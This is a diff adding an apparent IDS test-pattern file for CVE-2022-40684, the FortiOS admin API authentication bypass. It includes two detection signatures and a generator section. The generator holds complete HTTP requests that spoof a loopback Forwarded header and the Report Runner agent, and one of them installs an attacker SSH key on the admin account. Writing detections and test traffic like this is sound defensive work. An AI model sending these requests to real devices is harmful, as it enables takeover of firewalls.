@@ -1,0 +1,55 @@
+id: TP-2022-40684
+cve: [CVE-2022-40684]
+name: FortiOS.Admin.API.Forwarded.Auth.Bypass
+severity: critical
+target: {os: [FortiOS], app: [FortiOS admin API]}
+location: server
+summary: >-
+  FortiOS 7.0.0-7.0.6 and 7.2.0-7.2.1 (and matching FortiProxy and FortiSwitchManager releases) trusted
+  requests that looked like they came from the box itself. A request to the REST API with the internal
+  "Report Runner" user agent and a Forwarded header claiming 127.0.0.1 skipped authentication. Public
+  exploitation used PUT on /api/v2/cmdb/system/admin/<user> to add an SSH key to an administrator.
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-40684
+  - https://horizon3.ai/fortios-fortiproxy-and-fortiswitchmanager-authentication-bypass-technical-deep-dive-cve-2022-40684/
+signatures:
+  - id: 9100011
+    name: Admin API request with a loopback Forwarded header and the Report Runner agent
+    proto: tcp
+    ports: [80, 443, 8443, 10443]
+    match:
+      - {buf: uri, contains: "/api/v2/", nocase: true}
+      - {buf: header, contains: "report runner", nocase: true}
+      - {buf: header, regex: "forwarded:\\s*for=\"?\\[?127\\.0\\.0\\.1", nocase: true}
+  - id: 9100012
+    name: Admin account change through the API from a loopback claim
+    proto: tcp
+    ports: [80, 443, 8443, 10443]
+    match:
+      - {buf: method, contains: "PUT"}
+      - {buf: uri, contains: "/api/v2/cmdb/system/admin/", nocase: true}
+      - {buf: header, regex: "forwarded:\\s*for=\"?\\[?127\\.0\\.0\\.1", nocase: true}
+generator:
+  port: 443
+  tls: true
+  variants:
+    - name: put-admin-ssh-key
+      request: |-
+        PUT /api/v2/cmdb/system/admin/admin HTTP/1.1
+        Host: {{target_host}}
+        User-Agent: Report Runner
+        Content-Type: application/json
+        Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";
+        Content-Length: 46
+        Connection: close
+
+        {"ssh-public-key1": "\"ssh-ed25519 {{token}}\""}
+    - name: get-system-status
+      request: |-
+        GET /api/v2/monitor/system/status HTTP/1.1
+        Host: {{target_host}}
+        User-Agent: Report Runner
+        Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";
+        Connection: close
+server_effect: {process: none, when: allowed}
+lesson: Admin access on the WAN is the real mistake; trusted hosts and a local-in policy stop this before the IPS has to, and the IPS only sees it with deep inspection.
